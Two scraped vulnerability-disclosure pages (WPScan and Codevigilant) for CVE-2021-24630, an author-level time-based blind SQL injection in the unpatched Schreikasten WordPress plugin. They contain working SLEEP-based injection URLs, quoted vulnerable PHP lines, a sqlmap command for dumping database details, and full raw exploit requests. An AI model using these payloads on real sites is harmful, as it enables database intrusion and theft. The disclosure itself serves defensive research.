=== Content from wpscan.com_4e51da9a_20250114_214908.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Schreikasten <= 0.14.18 - Author+ SQL Injections

### Description

The plugin does not sanitise or escape the id GET parameter before using it in SQL statements in the comments dashboard from various actions, leading to authenticated SQL Injections which can be exploited by users as low as author

### Proof of Concept

https://example.com/wp-admin/edit-comments.php?page=skmanage&mode=edit&text&paged=1&mode\_x=delete\_x&id=6%20AND%20(SELECT%209304%20FROM%20(SELECT(SLEEP(5)))ghFg)
https://example.com/wp-admin/edit-comments.php?page=skmanage&mode=tracking&text&paged=1&mode\_x=delete\_x&id=7&tid=6%20AND%20(SELECT%209304%20FROM%20(SELECT(SLEEP(5)))ghFg)
https://example.com/wp-admin/edit-comments.php?page=skmanage&mode&text&paged=1&mode\_x=set\_black\_x&id=2%20AND%20(SELECT%20614%20 FROM (SELECT(SLEEP(5)))ewlo)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

schreikasten](https://a8cteam5105.wordpress.com/plugin/schreikasten/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/x-icon.svg)
No known fix

### References

CVE
[CVE-2021-24630](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24630)

URL
<https://codevigilant.com/disclosure/2021/wp-plugin-schreikasten/>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[8.2 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:L)

### Miscellaneous

Original Researcher
Shreya Pohekar of Codevigilant Project

Verified
Yes

WPVDB ID
[a0787dae-a4b7-4248-9960-aaffabfaeb9f](https://a8cteam5105.wordpress.com/vulnerability/a0787dae-a4b7-4248-9960-aaffabfaeb9f/)

### Timeline

Publicly Published
2021-10-07 (about 3 years ago)

Added
2021-10-07 (about 3 years ago)

Last Updated
2022-04-12 (about 2 years ago)

### Other

Published
Title

Published
2022-11-28
Title
[JoomSport < 5.2.8 - Unauthenticated SQLi](https://a8cteam5105.wordpress.com/vulnerability/5c96bb40-4c2d-4e91-8339-e0ddce25912f/)

Published
2024-11-28
Title
[Ni WooCommerce Cost Of Goods <= 3.2.8 - Authenticated (Administrator+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/e867c064-62f2-4246-965b-d51523c4ebac/)

Published
2024-04-09
Title
[AIKit <= 4.14.1 - Authenticated (Contributor+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/89d3d892-9c4b-41b7-a02a-08f0b2d04dd1/)

Published
2024-12-17
Title
[WPLMS < 1.9.9.5.3 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/e137361f-0c87-48d9-baa8-71e55e4be7ac/)

Published
2024-04-12
Title
[Realtyna Organic IDX plugin < 4.14.8 - Unauthenticated SQLi](https://a8cteam5105.wordpress.com/vulnerability/d22a60bc-b9c6-4a26-97cc-8e6ec0a15c1b/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from codevigilant.com_47d9be2a_20250114_214907.html ===

[![](/banner.png)](https://codevigilant.com/)

* [Home](/)
* [Disclosure](/disclosure/)
  + [INJECTION](/category/injection/)
  + [CROSS-SITE SCRIPTING (XSS)](/category/cross-site-scripting-xss/)
  + [INFORMATION DISCLOSURE](/category/information-disclosure/)
  + [LOCAL FILE INCLUSION](/category/local-file-inclusion/)
  + [SSRF/XSPA](/category/ssrf/)
  + [COMPONENTS WITH KNOWN VULNERABILITIES](/category/components-with-known-vulnerabilities/)
  + [UNVALIDATED REDIRECTS AND FORWARDS](/category/unvalidated-redirects-and-forwards/)
* [Blog](/blog/)
* [RSS Feed](/index.xml)
* [About Team](/about-team/)

Wp Plugin Schreikasten
### Plugin Details

Plugin Name: [wp-plugin : schreikasten](https://wordpress.org/plugins/schreikasten/)
Effected Version : 0.14.18 (and most probably lower version's if any)
Vulnerability : [Injection](/category/injection/)
Minimum Level of Access Required : Author
CVE Number : CVE-2021-24630
Identified by : [Shreya Pohekar](/author/shreya_pohekar/)
[WPScan Reference URL](https://wpscan.com/plugin/schreikasten/)
### Disclosure Timeline

* June 15, 2021: Issue Identified and Disclosed to WPScan
* June 21, 2021 : Plugin Closed
* August 13, 2021 : CVE Assigned
* October 7, 2021 : Public Disclosure

### Technical Details

The reject, spam, delete and tracking functionality having GET parameters `id` and `tid`, available to Author and higher roles isnt properly sanitised, escaped or validated before being inserted into the SQL statement, therefore leading to time-based bline SQL Injection.

Vulnerable Code: [schreikasten.php#L2208](https://plugins.trac.wordpress.org/browser/schreikasten/trunk/schreikasten.php#L2208)

1. Edit functionality

```
2206:			$id=$_GET['id'];
2207:			$table_name = $wpdb->prefix . "schreikasten";
2208:			$data = $wpdb->get_row("select alias, text, status, date, email from $table_name where id=$id");

```

Vulnerable Code: [schreikasten.php#L2224](https://plugins.trac.wordpress.org/browser/schreikasten/trunk/schreikasten.php#L2224)

2. In the tracking functionality

```
2222:			$tid=$_GET['tid'];
2223:			$table_name = $wpdb->prefix . "schreikasten";
2224:			$data = $wpdb->get_row("select * from $table_name where id=$tid");

```

Vulnerable Code: [schreikasten.php#L2239](https://plugins.trac.wordpress.org/browser/schreikasten/trunk/schreikasten.php#L2239)

3. set\_spam, set\_ham, set\_black functionality

```
2237:			$id=$_GET['id'];
2238:			$table_name = $wpdb->prefix . "schreikasten";
2239:			$data = $wpdb->get_row("select alias, text, status, date, email from $table_name where id=$id");

```
#### PoC Screenshot

![schreikasten-poc](/disclosure_screenshots/schreikasten-poc.png)
![schreikasten-poc-1](/disclosure_screenshots/schreikasten-poc-1.png)

## Request

## SQLmap command

```
sqlmap -r schreikasten.req.1 --dbms mysql --current-user --current-db -b -p tid --batch

```

```
GET /wp-admin/edit-comments.php?page=skmanage&mode=edit&text&paged=1&mode_x=delete_x&id=6 AND (SELECT 9304 FROM (SELECT(SLEEP(5)))ghFg) HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/wp-admin/edit-comments.php?page=skmanage&mode&text&paged=1&mode_x=delete_x&id=5
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7C7d46e52fd4a194588368c613588ee7cad1e52536df2ef3b1feb852a651d0be7f; __eucookielaw=true; _ga=GA1.1.436418670.1617784311; wp-settings-time-4=1619288085; ignored_html_tags=1; manage_settings=1; wordpress_test_cookie=WP%20Cookie%20check; sk-id=-732593242; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26posts_list_mode%3Dlist; wp-settings-time-1=1619788600; comment_author_232395f24f6cff47569f2739c21385d6=admin; comment_author_email_232395f24f6cff47569f2739c21385d6=admin%40localhost.com; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7Cbdffb007e4474c2bef17258655b9ead9c8b9bfc828fd770ad8adb901596a5dbb
Connection: close

```

2. Tracking

```
GET /wp-admin/edit-comments.php?page=skmanage&mode=tracking&text&paged=1&mode_x=delete_x&id=7&tid=6 AND (SELECT 9304 FROM (SELECT(SLEEP(5)))ghFg) HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/wp-admin/edit-comments.php?page=skmanage&mode&text&paged=1&mode_x=delete_x&id=7
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7C7d46e52fd4a194588368c613588ee7cad1e52536df2ef3b1feb852a651d0be7f; __eucookielaw=true; _ga=GA1.1.436418670.1617784311; wp-settings-time-4=1619288085; ignored_html_tags=1; manage_settings=1; wordpress_test_cookie=WP%20Cookie%20check; sk-id=-732593242; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26posts_list_mode%3Dlist; wp-settings-time-1=1619788600; comment_author_232395f24f6cff47569f2739c21385d6=admin; comment_author_email_232395f24f6cff47569f2739c21385d6=admin%40localhost.com; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7Cbdffb007e4474c2bef17258655b9ead9c8b9bfc828fd770ad8adb901596a5dbb
Connection: close

```

3. set\_spam, set\_ham, set\_black

```
GET /wp-admin/edit-comments.php?page=skmanage&mode&text&paged=1&mode_x=set_black_x&id=2 AND (SELECT 6141 FROM (SELECT(SLEEP(5)))ewlo) HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/wp-admin/edit-comments.php?page=skmanage&mode&text
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7C7d46e52fd4a194588368c613588ee7cad1e52536df2ef3b1feb852a651d0be7f; __eucookielaw=true; _ga=GA1.1.436418670.1617784311; wp-settings-time-4=1619288085; ignored_html_tags=1; manage_settings=1; wordpress_test_cookie=WP%20Cookie%20check; sk-id=-732593242; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26posts_list_mode%3Dlist; wp-settings-time-1=1619788600; comment_author_232395f24f6cff47569f2739c21385d6=admin; comment_author_email_232395f24f6cff47569f2739c21385d6=admin%40localhost.com; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1619961721%7CFTC7yo2JId9TWGN3c4mMtWOdy9aC5xBCxeIIMFHEXFC%7Cbdffb007e4474c2bef17258655b9ead9c8b9bfc828fd770ad8adb901596a5dbb
Connection: close

```

---

Â© [Anant Shrivastava](https://anantshri.info)
2023


